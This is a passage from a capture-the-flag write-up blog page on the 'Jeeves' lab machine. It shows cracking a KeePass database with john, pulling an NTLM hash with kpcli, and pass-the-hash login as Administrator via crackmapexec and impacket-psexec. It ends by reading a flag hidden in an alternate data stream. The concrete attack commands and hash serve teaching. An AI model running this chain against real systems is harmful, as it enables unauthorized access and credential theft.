+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">john</span> <span class="n">CEH</span><span class="o">.</span><span class="n">kdbx</span><span class="o">-</span><span class="nb">hash</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/28.png"
+	width="975"
+	height="370"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
+	
+></p>
+<p>Now it&rsquo;s time to grab the passwords from this <code>CEH.kdbx</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">kpcli</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">open KEH.kdbx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After entering the <code>moonshine1</code> password we find 7 password entries.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find .
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/29.png"
+	width="950"
+	height="580"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
+	
+></p>
+<p>We find a hash in entry <code>0</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show -f 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We put the hash in a file for Pass The Hash attacks.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#34;</span> <span class="o">&gt;</span> <span class="n">hashes</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/30.png"
+	width="1887"
+	height="525"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="359"
+		data-flex-basis="862px"
+	
+></p>
+<p>We use <code>crackmapexec</code> to test the hash on the smb server. We find out the hash works on administrator.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.10.63</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">auth</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">H</span> <span class="n">hashes</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/31.png"
+	width="1478"
+	height="258"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="572"
+		data-flex-basis="1374px"
+	
+></p>
+<p>We use <code>impacket-psexec</code> to get on the server as Administrator.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">impacket</span><span class="o">-</span><span class="n">psexec</span> <span class="n">Administrator</span><span class="o">@</span><span class="mf">10.10.10.63</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e0fb1fb85756c24235ff238cbe81fe00</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/32.png"
+	width="1261"
+	height="429"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="705px"
+	
+></p>
+<p>Instead of a root flag, we find <code>hm.txt</code> .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">cd</span> c:\users\administrator\desktop
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/33.png"
+	width="946"
+	height="405"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+></p>
+<p>The file says <code>&quot;The flag is elsewhere. Look deeper&quot;</code> .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> hm.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/34.png"
+	width="917"
+	height="79"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1160"
+		data-flex-basis="2785px"
+	
+></p>
+<p>Let&rsquo;s look deeper into the <code>hm.txt</code> file, then.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /r
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/35.png"
+	width="966"
+	height="310"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
+	
+></p>
+<p>We read the <code>root.txt</code>stream with <code>CMD</code> or <code>PowerShell</code>.</p>
+<p><strong>CMD:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">more <span class="p">&lt;</span> hm.txt:root.txt:$DATA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>PowerShell:</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="nb">Get-Content</span> <span class="n">hm</span><span class="p">.</span><span class="py">txt</span> <span class="n">-stream</span> <span class="n">root</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/jeeves/36.png"
+	width="956"
+	height="143"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="668"
+		data-flex-basis="1604px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/law/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/categories/offsec/offsec-edit.png" loading="lazy" data-key="" data-hash="/categories/offsec/offsec-edit.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Law</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 Blue Pho3nix
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.25.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
